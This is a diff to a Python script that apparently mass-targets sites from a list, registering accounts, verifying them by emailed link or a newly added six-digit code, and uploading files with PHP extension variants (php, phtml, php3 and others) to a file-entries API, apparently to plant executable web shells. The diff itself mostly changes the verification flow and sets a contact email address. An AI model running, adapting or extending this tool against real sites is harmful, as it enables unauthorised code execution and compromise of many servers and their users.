@@ -1,9 +1,5 @@
 import requests
 import json
-import imaplib
-import email
-import re
-import time
 import os
 
 # === Config ===
@@ -12,7 +8,7 @@ EXTENSIONS = ["php", "phtml", "php3", "php5", "php7", "php56", "php74", "php83",
 REGISTER_ENDPOINT = "/auth/register"
 LOGIN_ENDPOINT = "/auth/login"
 UPLOAD_ENDPOINT = "/api/v1/file-entries"
-EMAIL = "yourmail@mail.com"
+EMAIL = "yucaerin@hotmail.com"
 PASSWORD = "123123123"
 
 with open("list.txt") as f:
@@ -98,16 +94,37 @@ for target in targets:
                 with open("result_needs_verification.txt", "a") as f:
                     f.write(f"{target}\n")
 
-                verif_url = input("🔗 Enter the email verification link: ").strip()
-                try:
-                    verif_resp = session.get(verif_url, timeout=10)
-                    if verif_resp.status_code == 200:
-                        print("✅ Verification successful, continuing to login...")
-                    else:
-                        print(f"❌ Verification failed with status {verif_resp.status_code}")
+                method = input("❓ Is the verification via link or code? (link/code): ").strip().lower()
+                if method == "link":
+                    verif_url = input("🔗 Enter the email verification link: ").strip()
+                    try:
+                        verif_resp = session.get(verif_url, timeout=10)
+                        if verif_resp.status_code == 200:
+                            print("✅ Verification via link successful, continuing to login...")
+                        else:
+                            print(f"❌ Verification failed with status {verif_resp.status_code}")
+                            continue
+                    except Exception as e:
+                        print(f"❌ Failed to access verification link: {e}")
                         continue
-                except Exception as e:
-                    print(f"❌ Failed to access verification link: {e}")
+                elif method == "code":
+                    otp_code = input("🔢 Enter the 6-digit verification code: ").strip()
+                    otp_endpoint = f"{target}/api/v1/validate-email-verification-otp"
+                    otp_headers = headers.copy()
+                    otp_headers["Referer"] = f"{target}/dashboard"
+                    payload = {"code": otp_code}
+                    try:
+                        otp_resp = session.post(otp_endpoint, headers=otp_headers, json=payload, timeout=10)
+                        if otp_resp.status_code == 200 and "success" in otp_resp.text:
+                            print("✅ Verification via code successful, continuing to login...")
+                        else:
+                            print(f"❌ Code verification failed with status {otp_resp.status_code}")
+                            continue
+                    except Exception as e:
+                        print(f"❌ Error during code verification: {e}")
+                        continue
+                else:
+                    print("❌ Invalid verification method.")
                     continue
             elif j.get("status") == "success":
                 print("✅ Registration successful without verification.")
